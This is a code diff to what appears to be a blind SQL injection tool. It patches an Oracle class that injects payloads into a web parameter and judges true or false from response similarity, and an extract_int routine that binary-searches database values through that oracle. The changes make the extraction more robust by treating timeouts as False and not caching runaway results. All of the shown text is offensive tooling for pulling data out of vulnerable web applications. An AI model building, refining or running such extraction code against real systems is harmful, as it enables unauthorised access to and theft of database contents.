@@ -130,6 +130,8 @@ class Oracle:
         if self.console is not None and self.console.verbose >= 2:
             self.console.trace(f"{self.param}={payload}", level=2)
         body = _inject(self.http, self.url, self.param, payload)
+        if not body:                    # timeout / empty: don't bias the search to True
+            return False
         return (difflib.SequenceMatcher(None, body, self._true).ratio()
                 >= difflib.SequenceMatcher(None, body, self._false).ratio())
 
@@ -240,6 +242,7 @@ def extract_int(oracle, expr, cap=1 << 21) -> int:
     hi = 1
     while hi < cap and oracle.ask(f"({expr}) > {hi}"):
         hi <<= 1
+    runaway = hi >= cap        # oracle kept saying ">" to the ceiling — biased (e.g. timeouts)
     lo = 0
     while lo < hi:
         mid = (lo + hi + 1) // 2
@@ -247,8 +250,8 @@ def extract_int(oracle, expr, cap=1 << 21) -> int:
             lo = mid
         else:
             hi = mid - 1
-    if cache is not None:
-        cache.put(expr, lo)
+    if cache is not None and not runaway:
+        cache.put(expr, lo)        # never cache a runaway value — don't poison later runs
     return lo
 
 
